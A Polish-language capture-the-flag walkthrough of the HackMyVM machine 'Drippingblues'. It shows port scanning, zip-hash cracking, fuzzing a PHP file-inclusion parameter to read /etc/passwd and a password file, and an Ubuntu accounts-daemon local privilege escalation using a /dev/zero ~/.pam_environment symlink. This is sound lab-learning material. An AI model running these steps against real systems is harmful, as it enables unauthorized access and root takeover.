---
title: "Drippingblues - Tasiyanci"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Walkthrough
  - HackMyVM
  - Drippingblues
header:
  overlay_image: /assets/images/pasek-hack.png
gallery1_2:
  - url: /assets/images/hacking/2021/15/01.png
    image_path: /assets/images/hacking/2021/15/01.png
  - url: /assets/images/hacking/2021/15/02.png
    image_path: /assets/images/hacking/2021/15/02.png
---
# Drippingblues by Tasiyanci
Write-up is in Polish language.
{: .text-justify}

## 00. Metainfo
* Wypuszczony: 20.09.2021
* Poziom: łatwy
* Obraz możesz ściągnąć [stąd](https://hackmyvm.eu/machines/machine.php?vm=Drippingblues)

## 01. Wstęp
Ta wirtualka jest bardzo podstępna, dużo czasu zabierają "niepotrzebne" czynności i ślepe zaułki. Jednak to jedna z jej cech. Dzięki temu można dużo rzeczy sobie przypomnieć i nieźle się sfrustrować. :smiley: Obraz również waży niemało, około 3 GB. Jest to zasługa interfejsu graficznego. Być może to jest **GNOME**(?) To może nam dać wskazówkę, że niekoniecznie trzeba się włamywać przez konsolę, a może tak?
{: .text-justify}
## 02. Szukanie otwartych portów
Zaczniemy jednak od konsoli.
{: .text-justify}
```bash
msf6 > db_nmap -T4 -A -p- 172.16.1.195
```
```console
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 14:36 CEST
[*] Nmap: Nmap scan report for drippingblues.lan (172.16.1.195)
[*] Nmap: Host is up (0.00041s latency).
[*] Nmap: Not shown: 65532 closed ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 21/tcp open  ftp     vsftpd 3.0.3
[*] Nmap: | ftp-anon: Anonymous FTP login allowed (FTP code 230)
[*] Nmap: |_-rwxrwxrwx    1 0        0             471 Sep 19 18:57 respectmydrip.zip [NSE: writeable]
[*] Nmap: | ftp-syst:
[*] Nmap: |   STAT:
[*] Nmap: | FTP server status:
[*] Nmap: |      Connected to ::ffff:172.16.1.10
[*] Nmap: |      Logged in as ftp
[*] Nmap: |      TYPE: ASCII
[*] Nmap: |      No session bandwidth limit
[*] Nmap: |      Session timeout in seconds is 300
[*] Nmap: |      Control connection is plain text
[*] Nmap: |      Data connections will be plain text
[*] Nmap: |      At session startup, client count was 2
[*] Nmap: |      vsFTPd 3.0.3 - secure, fast, stable
[*] Nmap: |_End of status
[*] Nmap: 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   3072 9e:bb:af:6f:7d:a7:9d:65:a1:b1:a1:be:91:cd:04:28 (RSA)
[*] Nmap: |   256 a3:d3:c0:b4:c5:f9:c0:6c:e5:47:64:fe:91:c5:cd:c0 (ECDSA)
[*] Nmap: |_  256 4c:84:da:5a:ff:04:b9:b5:5c:5a:be:21:b6:0e:45:73 (ED25519)
[*] Nmap: 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
[*] Nmap: | http-robots.txt: 2 disallowed entries
[*] Nmap: |_/dripisreal.txt /etc/dripispowerful.html
[*] Nmap: |_http-server-header: Apache/2.4.41 (Ubuntu)
[*] Nmap: |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
[*] Nmap: MAC Address: B6:B6:42:48:B5:89 (Unknown)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 4.X|5.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
[*] Nmap: OS details: Linux 4.15 - 5.6
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.41 ms drippingblues.lan (172.16.1.195)
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 10.31 seconds
```
Są trzy otwarte porty: **21-FTP**,**22-SSH** i **80-WWW**. Już podczas skanowania **Nmap**em widać, że na **FTP** jest dostęp przez **Anonymous**.
{: .text-justify}
## 03. Pierwszy fałszywy trop
Na **FTP** jest plik **respectmydrip.zip**. Oczywiście ma hasło. Spróbujemy je złamać, ale wcześniej trzeba odzyskać hash. Do tego użyjemy **Zip2john** i **John**.
{: .text-justify}
```bash
# zip2john respectmydrip.zip > respectmydrip.zip.hash
# john -wordlist=/usr/share/wordlists/rockyou.txt respectmydrip.zip.hash
# Press 'q' or Ctrl-C to abort, almost any other key for status
# 072528035        (respectmydrip.zip/respectmydrip.txt)
```
Hasło do rozpakowania pliku to **072528035**.  Odzyskaliśmy dwa pliki, jeden to jest wskazówka:
<div class="notice--primary" markdown="1">
respectmydrip.txt
```
just focus on "drip"
```
</div>
A drugi to **secret.zip**. Niestety nie udało się złamać do niego hasła. W sumie wyszło, że to pierwsza podpucha.
{: .text-justify}

## 04. Drugi fałszywy trop
Zobaczmy co się dzieję na naszej **WWW**. Zaczynamy na szybko standardowe skanowanko:
{: .text-justify}
```bash
# dirb  http://172.16.1.195
```
```console
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Oct  4 17:49:41 2021
URL_BASE: http://172.16.1.195/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.16.1.195/ ----
+ http://172.16.1.195/index.php (CODE:200|SIZE:138)
+ http://172.16.1.195/robots.txt (CODE:200|SIZE:78)
+ http://172.16.1.195/server-status (CODE:403|SIZE:277)

-----------------
END_TIME: Mon Oct  4 17:49:43 2021
DOWNLOADED: 4612 - FOUND: 3
```
Poniżej zawartość pliku **robots.txt**
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.195/robots.txt
```
User-agent: *
Disallow: /dripisreal.txt
Disallow: /etc/dripispowerful.html
```
</div>
Zobaczmy co się kryję pod **dripisreal.txt**:
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.195/dripisreal.txt
```
hello dear hacker wannabe,

go for this lyrics:

https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html

count the n words and put them side by side then md5sum it

ie, hellohellohellohello >> md5sum hellohellohellohello

it's the password of ssh
```
</div>
Jest tam odwołanie do strony. Ze strony należy ściągnąć tekst piosenki, policzyć(?) i ułożyć wyrazy obok siebie. Wchodząc tam widzimy tekst piosenki, ale nie wiadomo, które słowa brać pod uwagę itd. Po konsultacjach okazało się, że to jest kolejna podpucha. To już druga. Nie marnujmy na to czasu.
{: .text-justify}

## 05. Login i hasło

Plik **index.php** zawiera taką wiadomość:
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.195/index.php
```
driftingblues is hacked again so it's now called drippingblues. :D hahaha
by
travisscott & thugger 
```
</div>
Jednak co należy zauważyć, to że **index.php** jest to plik w formacie **PHP**. Nieśmiało można założyć, że będzie można coś z tym zrobić. Należy znaleźć parametr. Można go albo zgadnąć, albo sprawdzić wszystkie opcje. Tym razem na tapetę weźmiemy większy słownik **rockyou.txt**.
{: .text-justify}
```bash
# ffuf -w /usr/share/wordlists/rockyou.txt -u http://172.16.1.195/index.php?FUZZ=/etc/passwd -fs 138  
```
```console
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://172.16.1.195/index.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 138
________________________________________________

drip                    [Status: 200, Size: 3032, Words: 50, Lines: 58]
:: Progress: [14344392/14344392] :: Job [1/1] :: 3463 req/sec :: Duration: [1:39:30] :: Errors: 861 ::
```
Po dłuższym czasie mamy parametr. W sumie można było go zgadnąć, prawda? :smiley: Sprawdźmy takie coś:
{: .text-justify}
<div class="notice--primary" markdown="1">
view-source:http://172.16.1.195/index.php?drip=/etc/dripispowerful.html
```
<!DOCTYPE html>
<html>
<body>
<style>
body {
background-image: url('drippin.jpg');
background-repeat: no-repeat;
}

@font-face {
    font-family: Segoe;
    src: url('segoeui.ttf');
}

.mainfo {
  text-align: center;
  border: 1px solid #000000;
  font-family: 'Segoe';
  padding: 5px;
  background-color: #ffffff;
  margin-top: 300px;
}

.emoji {
	width: 32px;
	}
</style>
password is:
imdrippinbiatch
</body>
</html>

<html>
<body>
driftingblues is hacked again so it's now called drippingblues. :D hahaha
<br>
by
<br>
travisscott & thugger
</body>
</html>
```
</div>
Jest hasło do **Shell**a. Jeżeli przejdziemy do wirtualki, zobaczymy **login**.
{: .text-justify}

## 06. Ostatnie podpucha
Jesteśmy na konsoli, jest tam dużo otwartych portów, ale nauczywszy się, że tutaj prawie wszędzie są ślepe zaułki i wirtualka jest na **GNOME**, to może coś będzie łatwego? Sprawdziwszy system jest na **Ubuntu 20.04**, więc można zastosować pewną sztuczkę. Chcę jednak przestrzec, że może się nie udać od razu. Możesz zablokować sobie konsolę przez maksymalne obciążenie procesora. Skasowanie pliku **~/.pam_environment** i restart serwera pomaga. Poniżej opiszę komendy jakie należy wykonać.
{: .text-justify}
```bash
#ln -s /dev/zero ~/.pam_environment
```
Zmieniamy język na inny: Settings->Region and lagunage -> Inny język
{: .text-justify}
```bash
# NrFromPidof=$(pidof accounts-daemon)
# kill -SIGSTOP $NrFromPidof
# rm ~/.pam_environment
# nohup bash -c "sleep 30s; kill -SIGSEGV $NrFromPidof; kill -SIGCONT $NrFromPidof" &
```
Po wydaniu ostatniej komendy mamy 30 sekund na wylogowanie się. Robimy to, następnie czekamy, aż system nas zaloguje, abyśby mogli stworzyć nowe konto. Mamy dostęp do **root**a przez **su**. Żeby to wszystko lepiej zrozumieć, poniżej zamieszczam filmik z **YouTube**.
{: .text-justify}
{% include video id="8IjTq7GBupw" provider="youtube" %}
## 07. Na dziś to już wszystko
Jeżeli podobał się wpis, napisz mejla na [kerszi@protonmail.com](mailto:kerszi@protonmail.com).
{: .text-justify}
{% include gallery id="gallery1_2" %}
